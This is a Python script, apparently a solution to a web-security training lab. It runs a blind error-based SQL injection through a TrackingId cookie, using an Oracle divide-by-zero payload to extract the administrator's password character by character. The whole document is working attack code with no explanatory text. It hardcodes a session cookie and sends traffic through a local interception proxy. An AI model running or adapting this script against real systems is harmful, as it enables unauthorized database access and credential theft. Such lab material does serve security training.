import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def sqli_password(url):
    pe = ''
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and ascii(SUBSTR(password,%s,1))='%s')|| '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'CJ0SWJenjIyIrQO0'+sqli_payload_encoded,'session':'Nr2haqLXRv6ZhtwutYwqGMrvhGNmaTlv'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 200:
                sys.stdout.write('\r' + pe + chr(j))
                sys.stdout.flush()
            else:
                pe += chr(j)
                sys.stdout.write('\r' + pe)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv[0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.excit(-1)
    url = sys.argv[1]
    print("[+] Retriving administrator password ...")
    sqli_password(url)



if __name__ == "__main__" :
    main()